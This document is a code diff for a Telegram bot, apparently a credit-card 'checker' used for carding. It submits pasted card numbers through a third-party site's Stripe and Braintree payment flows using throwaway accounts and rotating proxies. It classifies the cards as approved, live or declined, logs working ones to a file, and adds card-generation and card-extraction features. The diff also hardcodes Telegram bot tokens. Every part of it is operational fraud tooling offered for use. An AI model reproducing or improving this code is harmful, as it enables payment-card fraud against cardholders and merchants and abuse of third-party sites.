@@ -22,9 +22,8 @@ from telegram.ext import (
 
 OWNER_ADMIN_ID = 7519839885
 ADMIN_ID_FILE = "admin_ids.txt"
-BOT_TOKEN = "8112017304:AAGsJv-F06cajaiSiho7x2SH_SUSdWOC7o0"
+BOT_TOKEN = "8112017304:AAEpGTDaaDy57lxQuikwUEGoTeL0mvz93OM"
 user_mode = "stripe"
-proxy_list = []
 
 def get_admin_chat_ids() -> set[int]:
     if os.path.exists(ADMIN_ID_FILE):
@@ -114,7 +113,7 @@ def load_proxies_from_file(file_path="proxy.txt"):
                     proxy_url = f"http://{user}:{pwd}@{host}:{port}"
                     proxies.append(proxy_url)
                 else:
-                    proxies.append(f"http://{line}")
+                    print(f"Invalid proxy format: {line}")
     except FileNotFoundError:
         proxies = []
     return proxies
@@ -134,7 +133,69 @@ def save_proxies_to_file(proxies, file_path="proxy.txt"):
     with open(file_path, "w", encoding="utf-8") as f:
         f.write("\n".join(lines))
 
-# ---------------------- STRIPE AUTH (DARI SCRIPT ASLI) ----------------------
+def get_card_info_from_api(bin_number):
+    try:
+        url = f"https://drlabapis.onrender.com/api/bin?bin={bin_number}"
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('status') == 'ok':
+                return {
+                    'brand': data.get('scheme', 'Unknown'),
+                    'country': data.get('country', 'Unknown'),
+                    'card_type': data.get('type', 'Unknown')
+                }
+    except Exception as e:
+        print(f"API call failed: {e}")
+    return None
+
+# Helper functions to determine card brand and type
+def get_card_brand(card_number):
+    """Determine card brand from card number"""
+    card_number = re.sub(r'\D', '', card_number)
+    if not card_number:
+        return "Unknown"
+    
+    # Check for Visa
+    if re.match(r'^4', card_number):
+        return "VISA"
+    # Check for Mastercard
+    elif re.match(r'^5[1-5]', card_number):
+        return "MASTERCARD"
+    # Check for American Express
+    elif re.match(r'^3[47]', card_number):
+        return "AMERICAN EXPRESS"
+    # Check for Discover
+    elif re.match(r'^6(?:011|5)', card_number):
+        return "DISCOVER"
+    # Check for Diners Club
+    elif re.match(r'^3[0689]', card_number):
+        return "DINERS CLUB"
+    # Check for JCB
+    elif re.match(r'^35(2[89]|[3-8][0-9])', card_number):
+        return "JCB"
+    # Check for UnionPay
+    elif re.match(r'^62', card_number):
+        return "UNIONPAY"
+    else:
+        return "Unknown"
+
+def get_card_type(card_number):
+    """Determine card type from card number"""
+    card_number = re.sub(r'\D', '', card_number)
+    if not card_number:
+        return "Unknown"
+    
+    if re.match(r'^4[89][0-9]{12}$', card_number) or re.match(r'^49[0-9]{14}$', card_number):
+        return "DEBIT"
+    elif re.match(r'^4[0-9]{12}(?:[0-9]{3})?$', card_number) or \
+         re.match(r'^5[1-5][0-9]{14}$', card_number) or \
+         re.match(r'^3[47][0-9]{13}$', card_number):
+        return "CREDIT"
+    else:
+        return "Unknown"
+
+# --- class Stripe, Braintree, dan fungsi utilitas ---
 class StripeAuth:
     @staticmethod
     def gets(s: str, start: str, end: str) -> str | None:
@@ -162,6 +223,20 @@ class StripeAuth:
                     expiry_valid = False
             except:
                 expiry_valid = False
+            
+            bin_number = cc[:6]
+            api_info = get_card_info_from_api(bin_number)
+            
+            brand = "Unknown"
+            card_type = "Unknown"
+            country = "Unknown"
+            
+            if api_info:
+                brand = api_info['brand']
+                card_type = api_info['card_type']
+                country = api_info['country']
+                print(f"Brand: {brand}, Country: {country}, Type: {card_type}")
+            
             headers = {
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'Accept-Language': 'en-US,en;q=0.9',
@@ -180,7 +255,7 @@ class StripeAuth:
             response = await session.get('https://elearntsg.com/login/', headers=headers)
             login = StripeAuth.gets(response.text, '"learndash-login-form" value="', '" />')
             if login is None:
-                return "Login token not found ", '', '', ''
+                return "Login token not found ", country, brand, card_type
             headers.update({
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Origin': 'https://elearntsg.com',
@@ -200,7 +275,7 @@ class StripeAuth:
             response = await session.get('https://elearntsg.com/my-account/add-payment-method/', headers=headers)
             nonce = StripeAuth.gets(response.text, '"add_card_nonce":"', '"')
             if nonce is None:
-                return "Nonce token not found ", '', '', ''
+                return "Nonce token not found ", country, brand, card_type
             headers_api = {
                 'accept': 'application/json',
                 'accept-language': 'en-US,en;q=0.9',
@@ -225,7 +300,7 @@ class StripeAuth:
                 'card[exp_month]': mes,
                 'card[exp_year]': ano,
                 'guid':'e449b162-3515-4886-87fa-abb185bba5ef094143',
-                'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',  # PERBAIKAN: ID yang benar
+                'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
                 'sid':'e111c2c6-927f-42ce-af16-8c70358cf59a6dea3e',
                 'payment_user_agent':'stripe.js/4e21d61aa2; stripe-js-v3/4e21d61aa2; split-card-element',
                 'referrer':'https://elearntsg.com',
@@ -240,11 +315,27 @@ class StripeAuth:
             pm_json = response.json()
             try:
                 id = pm_json.get('id')
-                brand = pm_json.get('card', {}).get('brand', '')
-                country = pm_json.get('card', {}).get('country', '')
-                card_type = pm_json.get('card', {}).get('funding', '')
+                stripe_brand = pm_json.get('card', {}).get('brand', '')
+                stripe_country = pm_json.get('card', {}).get('country', '')
+                stripe_card_type = pm_json.get('card', {}).get('funding', '')
             except:
-                return response.text, '', '', ''
+                return response.text, country, brand, card_type
+            
+            if api_info:
+                pass
+            else:
+                if stripe_brand:
+                    brand = stripe_brand.upper()
+                if stripe_card_type:
+                    card_type = stripe_card_type.upper()
+                if stripe_country:
+                    country = stripe_country.upper()
+            
+            if brand == "Unknown":
+                brand = get_card_brand(cc)
+            if card_type == "Unknown":
+                card_type = get_card_type(cc)
+            
             error_message = pm_json.get('error', {}).get('message', None)
             if not expiry_valid and error_message is None:
                 error_message = "Expiration date invalid "
@@ -271,7 +362,7 @@ class StripeAuth:
             response = await session.post('https://elearntsg.com/', params=params_confirm, headers=headers_confirm, data=data_confirm)
             return response.text, country, brand, card_type
         except Exception as e:
-            return f"EXCEPTION: {str(e)}", '', '', ''
+            return f"EXCEPTION: {str(e)}", country, brand, card_type
 
     @staticmethod
     async def charge_resp(result):
@@ -334,19 +425,19 @@ class StripeAuth:
                 error_message = unescape(json_resp["error"].get("message","")).strip()
                 output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
                           f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
-                          f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_message} ❌\n"
-                          f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n"
-                          f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
-                          f"𝗧𝘆𝗽𝗲 ➯ {card_type}\n")
+                          f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
+                          f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
+                          f"𝗧𝘆𝗽𝗲 ➯ <b>{card_type}</b>\n"
+                          f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_message} ❌\n")
                 return output
         except:
             pass
         output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
                   f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
-                  f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}\n"
-                  f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n"
-                  f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
-                  f"𝗧𝘆𝗽𝗲 ➯ {card_type}\n")
+                  f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
+                  f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
+                  f"𝗧𝘆𝗽𝗲 ➯ <b>{card_type}</b>\n"
+                  f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}\n")
         if response in ["Approved ✅", "CVV INCORRECT ❎", "CVV MATCH ✅", "INSUFFICIENT FUNDS ✅"]:
             with open("auth.txt", "a", encoding="utf-8") as f:
                 f.write(output + "\n")
@@ -354,12 +445,7 @@ class StripeAuth:
 
     @staticmethod
     async def start_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        # Check if update is a CallbackQuery or regular Update
-        if hasattr(update, 'callback_query'):
-            chat_id = update.callback_query.from_user.id
-        else:
-            chat_id = update.effective_chat.id
-        
+        chat_id = update.effective_chat.id
         active_mode_per_chat[chat_id] = 'stripe'
         if hasattr(update, 'callback_query'):
             await update.callback_query.edit_message_text(
@@ -370,7 +456,6 @@ class StripeAuth:
                 "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
             )
 
-# ---------------------- STRIPE CHARGE (DARI SCRIPT BARU) ----------------------
 class StripeCharge:
     @staticmethod
     async def create_payment_method(fullz, session):
@@ -379,6 +464,20 @@ class StripeCharge:
             user = "renasenon" + str(random.randint(9999, 574545))
             mail = "renasenon" + str(random.randint(9999, 574545)) + "@gmail.com"
             pwd = "renasenon" + str(random.randint(9999, 574545))
+            
+            bin_number = cc[:6]
+            api_info = get_card_info_from_api(bin_number)
+            
+            brand = "Unknown"
+            card_type = "Unknown"
+            country = "Unknown"
+            
+            if api_info:
+                brand = api_info['brand']
+                card_type = api_info['card_type']
+                country = api_info['country']
+                print(f"Brand: {brand}, Country: {country}, Type: {card_type}")
+            
             headers = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'en-US,en;q=0.9',
@@ -439,11 +538,29 @@ class StripeCharge:
             }
             response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
             pm_json = response.json()
+            
             id = pm_json.get('id')
-            brand = pm_json.get('card', {}).get('brand', '')
-            last4 = pm_json.get('card', {}).get('last4', '')
-            country = pm_json.get('card', {}).get('country', '')
-            card_type = pm_json.get('card', {}).get('funding', '')
+            card_data = pm_json.get('card', {})
+            
+            stripe_brand = card_data.get('brand', '')
+            stripe_country = card_data.get('country', '')
+            stripe_card_type = card_data.get('funding', '')
+            
+            if api_info:
+                pass
+            else:
+                if stripe_brand:
+                    brand = stripe_brand.upper()
+                if stripe_card_type:
+                    card_type = stripe_card_type.upper()
+                if stripe_country:
+                    country = stripe_country.upper()
+            
+            if brand == "Unknown":
+                brand = get_card_brand(cc)
+            if card_type == "Unknown":
+                card_type = get_card_type(cc)
+            
             headers = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'en-US,en;q=0.9',
@@ -480,7 +597,7 @@ class StripeCharge:
                 'submit-checkout': '1',
                 'javascriptok': '1',
                 'payment_method_id': id,
-                'AccountNumber': f'XXXXXXXXXXXX{last4}',
+                'AccountNumber': f'XXXXXXXXXXXX{card_data.get("last4", "")}',
                 'ExpirationMonth': mes,
                 'ExpirationYear': ano,
             }
@@ -492,104 +609,142 @@ class StripeCharge:
             )
             return response.text, country, brand, card_type
         except Exception as e:
-            return str(e), "", "", ""
+            return str(e), country, brand, card_type
 
     @staticmethod
     async def multi_checking(x, proxy=None):
         cc, mes, ano, cvv = x.split("|")
-        async with httpx.AsyncClient(proxies=proxy, timeout=40) as session:
-            result, country, brand, card_type = await StripeCharge.create_payment_method(x, session)
         
-        card_info = (
-            f"𝗖𝗮𝗿𝗱 ➯ <code>{x}</code>\n"
-            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\n"
-            f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
-            f"𝗧𝘆𝗽𝗲 ➯ {card_type}\n"
-            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n"
-        )
-        gateway = "𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘"
+        bin_number = cc[:6]
+        api_info = get_card_info_from_api(bin_number)
+        
+        brand = "Unknown"
+        card_type = "Unknown"
+        country = "Unknown"
+        
+        if api_info:
+            brand = api_info['brand']
+            card_type = api_info['card_type']
+            country = api_info['country']
+            print(f"Brand: {brand}, Country: {country}, Type: {card_type}")
+        
+        # Validate card number
         if not is_valid_credit_card_number(cc):
+            card_info = (
+                f"𝗖𝗮𝗿𝗱 ➯ <code>{x}</code>\n"
+                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\n"
+                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
+                f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
+                f"𝗧𝘆𝗽𝗲 ➯ <b>{card_type}</b>\n"
+            )
             error_msg = "Incorrect card number ❌"
             return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_msg}"
         
+        # Validate expiry date
         valid, err = validate_expiry_date(mes, ano)
         if not valid:
+            card_info = (
+                f"𝗖𝗮𝗿𝗱 ➯ <code>{x}</code>\n"
+                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\n"
+                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
+                f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
+                f"𝗧𝘆𝗽𝗲 ➯ <b>{card_type}</b>\n"
+            )
             error_msg = "Expiration date invalid ❌" if "Expiration" in err else err + " ❌"
             return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_msg}"
         
-        error_message = ""
-        response = ""
-        try:
-            html_content = result["html"] if isinstance(result, dict) else result
-            json_resp = json.loads(html_content)
-            if "error" in json_resp:
-                raw_html = unescape(json_resp["error"].get("message", ""))
-                soup = BeautifulSoup(raw_html, "html.parser")
-                div = soup.find("div", class_="message-container")
-                error_message = div.get_text(separator=" ", strip=True) if div else raw_html.strip()
-        except Exception:
+        async with httpx.AsyncClient(proxies=proxy, timeout=40) as session:
+            result, stripe_country, stripe_brand, stripe_card_type = await StripeCharge.create_payment_method(x, session)
+            
+            if api_info:
+                pass
+            else:
+                if stripe_brand:
+                    brand = stripe_brand.upper()
+                if stripe_card_type:
+                    card_type = stripe_card_type.upper()
+                if stripe_country:
+                    country = stripe_country.upper()
+            
+            if brand == "Unknown":
+                brand = get_card_brand(cc)
+            if card_type == "Unknown":
+                card_type = get_card_type(cc)
+            
+            card_info = (
+                f"𝗖𝗮𝗿𝗱 ➯ <code>{x}</code>\n"
+                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\n"
+                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
+                f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
+                f"𝗧𝘆𝗽𝗲 ➯ <b>{card_type}</b>\n"
+            )
+            
+            error_message = ""
+            response = ""
             try:
-                html_for_parse = result["html"] if isinstance(result, dict) else result
-                soup = BeautifulSoup(unescape(html_for_parse), "html.parser")
-                error_div = soup.find('div', {'id': 'pmpro_message_bottom'})
-                if error_div:
-                    error_message = error_div.get_text(strip=True)
-                else:
-                    ul = soup.find("ul", class_="woocommerce-error")
-                    li = ul.find("li") if ul else None
-                    if li:
-                        error_message = li.get_text(separator=" ", strip=True)
-                    else:
+                try:
+                    json_resp = json.loads(result)
+                    if "error" in json_resp:
+                        raw_html = unescape(json_resp["error"].get("message", ""))
+                        soup = BeautifulSoup(raw_html, "html.parser")
                         div = soup.find("div", class_="message-container")
-                        if div:
-                            error_message = div.get_text(separator=" ", strip=True)
+                        error_message = div.get_text(separator=" ", strip=True) if div else raw_html.strip()
+                except:
+                    soup = BeautifulSoup(unescape(result), "html.parser")
+                    error_div = soup.find('div', {'id': 'pmpro_message_bottom'})
+                    if error_div:
+                        error_message = error_div.get_text(strip=True)
+                    else:
+                        ul = soup.find("ul", class_="woocommerce-error")
+                        li = ul.find("li") if ul else None
+                        if li:
+                            error_message = li.get_text(separator=" ", strip=True)
+                        else:
+                            div = soup.find("div", class_="message-container")
+                            if div:
+                                error_message = div.get_text(separator=" ", strip=True)
             except Exception:
+                pass
+            
+            if "Reason: " in error_message:
+                _, _, after = error_message.partition("Reason: ")
+                error_message = after.strip()
+            
+            if "Payment method successfully added." in error_message:
+                response = "Approved ✅"
                 error_message = ""
-        
-        if "Reason: " in error_message:
-            _, _, after = error_message.partition("Reason: ")
-            error_message = after.strip()
-        
-        if "Payment method successfully added." in error_message:
-            response = "Approved ✅"
-            error_message = ""
-        elif "Your card has insufficient funds." in error_message:
-            response = "Insufficient Funds ❎"
-            error_message = ""
-        elif "Your card's security code is incorrect." in error_message or "Your card does not support this type of purchase." in error_message:
-            response = "CCN LIVE ❎"
-            error_message = ""
-        elif "Customer authentication is required to complete this transaction." in error_message:
-            response = "3D Challenge Required ❎"
-            error_message = ""
-        elif "Your card was declined." in error_message:
-            response = "DECLINED ❌"
-            error_message = ""
-        elif "Invalid account." in error_message:
-            response = "INVALID ACCOUNT ❌"
-            error_message = ""
-        elif "Your card number is incorrect." in error_message:
-            response = "INCORRECT CARD NUMBER ❌"
-            error_message = ""
-        elif "Suspicious activity detected. Try again in a few minutes." in error_message:
-            response = "TRY AGAIN LATER ❌"
-            error_message = ""
-        
-        if error_message:
-            return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_message}"
-        elif response:
-            return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}"
-        else:
-            return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ Charged $35"
+            elif "Your card has insufficient funds." in error_message:
+                response = "Insufficient Funds ❎"
+                error_message = ""
+            elif "Your card's security code is incorrect." in error_message or "Your card does not support this type of purchase." in error_message:
+                response = "CCN LIVE ❎"
+                error_message = ""
+            elif "Customer authentication is required to complete this transaction." in error_message:
+                response = "3D Challenge Required ❎"
+                error_message = ""
+            elif "Your card was declined." in error_message:
+                response = "DECLINED ❌"
+                error_message = ""
+            elif "Invalid account." in error_message:
+                response = "INVALID ACCOUNT ❌"
+                error_message = ""
+            elif "Your card number is incorrect." in error_message:
+                response = "INCORRECT CARD NUMBER ❌"
+                error_message = ""
+            elif "Suspicious activity detected. Try again in a few minutes." in error_message:
+                response = "TRY AGAIN LATER ❌"
+                error_message = ""
+            
+            if error_message:
+                return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_message}"
+            elif response:
+                return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}"
+            else:
+                return f"{card_info}𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ Charged $35"
 
     @staticmethod
     async def start_stripe_charge(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        # Check if update is a CallbackQuery or regular Update
-        if hasattr(update, 'callback_query'):
-            chat_id = update.callback_query.from_user.id
-        else:
-            chat_id = update.effective_chat.id
-        
+        chat_id = update.effective_chat.id
         active_mode_per_chat[chat_id] = 'stripe_charge'
         if hasattr(update, 'callback_query'):
             await update.callback_query.edit_message_text(
@@ -600,7 +755,6 @@ class StripeCharge:
                 "𝗦𝗧𝗥𝗜𝗣𝗘 𝗖𝗛𝗔𝗥𝗚𝗘\nSEND CARDS ➯ CC|MM|YY|CVV"
             )
 
-# ---------------------- BRAINTREE AUTH (DARI SCRIPT ASLI) ----------------------
 class BraintreeAuth:
     @staticmethod
     def gets(s: str, start: str, end: str) -> str | None:
@@ -878,18 +1032,16 @@ class BraintreeAuth:
             output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
                       f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
                       f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_msg} ❌\n"
-                      f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
-                      f"𝗕𝗮𝗻𝗸 ➯ {bank}\n"
-                      f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱 ➯ {prepaid}\n"
-                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n")
+                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
+                      f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
+                      f"𝗕𝗮𝗻𝗸 ➯ <b>{bank}</b>\n")
         else:
             output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
                       f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
                       f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}\n"
-                      f"𝗕𝗿𝗮𝗻𝗱 ➯ {brand}\n"
-                      f"𝗕𝗮𝗻𝗸 ➯ {bank}\n"
-                      f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱 ➯ {prepaid}\n"
-                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ {country}\n")
+                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
+                      f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
+                      f"𝗕𝗮𝗻𝗸 ➯ <b>{bank}</b>\n")
             if response in ["Approved ✅", "CVV INCORRECT ❎", "CVV MATCH ✅", "INSUFFICIENT FUNDS ✅"]:
                 with open("auth.txt", "a") as f:
                     f.write(output + "\n")
@@ -897,11 +1049,7 @@ class BraintreeAuth:
 
     @staticmethod
     async def start_braintree(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-        if hasattr(update, 'callback_query'):
-            chat_id = update.callback_query.from_user.id
-        else:
-            chat_id = update.effective_chat.id
-        
+        chat_id = update.effective_chat.id
         active_mode_per_chat[chat_id] = 'braintree'
         if hasattr(update, 'callback_query'):
             await update.callback_query.edit_message_text(
@@ -912,7 +1060,6 @@ class BraintreeAuth:
                 "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\nSEND CARDS ➯ CC|MM|YY|CVV"
             )
 
-# ---------------------- HANDLER CC MESSAGE ----------------------
 async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
     if chat_id not in admin_chat_ids:
@@ -940,6 +1087,7 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
                 result = await BraintreeAuth.multi_checking(card)
             elif mode == 'stripe_charge':
                 await asyncio.sleep(20)
+                proxy_list = load_proxies_from_file()
                 proxy = random.choice(proxy_list) if proxy_list else None
                 result = await StripeCharge.multi_checking(card, proxy)
             progress_percent = int((i / total) * 100)
@@ -955,8 +1103,8 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     except Exception as e:
         await update.message.reply_text(f"ERROR: {str(e)}")
 
-# ---------------------- CC GENERATOR (/gen) ----------------------
 API_URL = "https://drlabapis.onrender.com/api/ccgenerator"
+
 def parse_input(input_text):
     input_text = input_text.strip()
     count = 10
@@ -981,7 +1129,7 @@ async def ccgen_advanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
         r = requests.get(API_URL, params=params)
         if r.status_code == 200:
             raw_ccs = r.text.strip().split('\n')
-            message_lines = ["🃏 CREDIT CARD GENERATOR 🃏\n"]
+            message_lines = ["🃏 CARDS GENERATOR 🃏\n"]
             message_lines.append("```")
             message_lines.extend(raw_ccs)
             message_lines.append("```")
@@ -997,7 +1145,6 @@ async def ccgen_advanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await ccgen_advanced(update, context)
 
-# ---------------------- CC CLEANER (/clean) ----------------------
 def extract_cc_from_line(line):
     pattern = re.compile(
         r"(\d{15,16})\|"
@@ -1018,10 +1165,7 @@ def extract_cc_from_file(input_file, output_file):
             f.write(item + "\n")
     return len(results)
 
-async def start_clean(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("HELLO! SEND THE FILE TO BE PROCESSED")
-
-async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     file = update.message.document
     os.makedirs("downloads", exist_ok=True)
     file_path = f"downloads/{file.file_name}"
@@ -1036,84 +1180,158 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("NO MATCHING CARDS DATA FOUND")
 
-async def clean_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("SEND THE FILE TO BE PROCESSED")
+async def edit_to_menu(update: Update, text: str, reply_markup: InlineKeyboardMarkup) -> None:
+    """Fungsi helper untuk mengedit pesan yang aktif menjadi menu baru"""
+    try:
+        if hasattr(update, 'callback_query'):
+            await update.callback_query.edit_message_text(
+                text=text,
+                reply_markup=reply_markup
+            )
+        else:
+            await update.message.reply_text(
+                text=text,
+                reply_markup=reply_markup
+            )
+    except Exception as e:
+        print(f"Error editing menu: {e}")
+        if hasattr(update, 'callback_query'):
+            await update.callback_query.message.reply_text(
+                text=text,
+                reply_markup=reply_markup
+            )
+        else:
+            await update.message.reply_text(
+                text=text,
+                reply_markup=reply_markup
+            )
 
-# ---------------------- COMMAND PROXY ----------------------
-async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    chat_id = update.effective_chat.id
-    if chat_id != OWNER_ADMIN_ID:
-        await update.message.reply_text("ONLY OWNER ADMIN CAN UPDATE PROXY ❌")
+async def show_admin_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    keyboard = [
+        [InlineKeyboardButton("ADD ADMIN", callback_data='addadmin')],
+        [InlineKeyboardButton("REMOVE ADMIN", callback_data='deladmin')],
+        [InlineKeyboardButton("BACK", callback_data='back')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    text = "𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨\n\n"
+    
+    await edit_to_menu(update, text, reply_markup)
+
+async def add_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    await query.answer()
+    
+    if query.from_user.id != OWNER_ADMIN_ID:
+        keyboard = [[InlineKeyboardButton("BACK", callback_data='admin')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "ONLY OWNER ADMIN CAN ADD ANOTHER ADMIN ❌",
+            reply_markup=reply_markup
+        )
         return
-    await update.message.reply_text(
-        "𝗣𝗥𝗢𝗫𝗬 𝗠𝗔𝗡𝗔𝗚𝗘𝗥\nSEND PROXIES ➯ HOST:PORT:USER:PASS"
+    
+    keyboard = [[InlineKeyboardButton("BACK", callback_data='admin')]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await query.edit_message_text(
+        "𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡\n\n"
+        "SEND USER ID TO ADD",
+        reply_markup=reply_markup
     )
+    
+    context.user_data['awaiting_admin_id'] = True
 
-async def message_handler_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def del_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    await query.answer()
+    
+    if query.from_user.id != OWNER_ADMIN_ID:
+        keyboard = [[InlineKeyboardButton("BACK", callback_data='admin')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "ONLY OWNER ADMIN CAN REMOVE AN ADMIN ❌",
+            reply_markup=reply_markup
+        )
+        return
+    
+    keyboard = [[InlineKeyboardButton("BACK", callback_data='admin')]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await query.edit_message_text(
+        "𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗗𝗠𝗜𝗡\n\n"
+        "SEND USER ID TO REMOVE",
+        reply_markup=reply_markup
+    )
+    
+    context.user_data['awaiting_admin_removal'] = True
+
+async def handle_admin_id_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
+    
     if chat_id != OWNER_ADMIN_ID:
+        await update.message.reply_text("ONLY OWNER ADMIN CAN MANAGE ADMINS ❌")
         return
-    text = update.message.text.strip()
-    lines = [line.strip() for line in text.splitlines() if line.strip()]
-    new_proxies = []
-    for line in lines:
-        parts = line.split(":")
-        if len(parts) == 4:
